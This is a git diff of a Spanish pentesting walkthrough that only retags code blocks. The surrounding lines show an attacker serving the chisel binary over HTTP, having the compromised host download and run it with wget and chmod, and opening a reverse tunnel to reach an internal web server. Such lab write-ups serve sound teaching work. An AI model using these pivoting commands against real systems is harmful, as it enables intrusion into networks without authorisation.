@@ -362,11 +362,11 @@ Entonces realizaremos un port forwarding del puerto `80` del host `172.18.0.4`. 
 
 Para subir el binario de chisel haremos uso de python3
 
-```c
+```python
  ❯ python3 -m http.server 80
 ```
 
-```c
+```python
 wget http://192.168.226.5/chisel    
 chmod +x chisel
 ```
@@ -379,13 +379,13 @@ Para realizar port forwarding y para tener mas informacion de realizarlo podemos
 
 Maquina atacante:
 
-```c
+```python
 ❯ ./chisel server  --reverse --port 8888
 ```
 
 Maquina cliente - 172.18.0.4 
 
-```c
+```python
 ./chisel client 10.2.2.19:8888 R:8001:172.18.0.3:80 
 ```
 
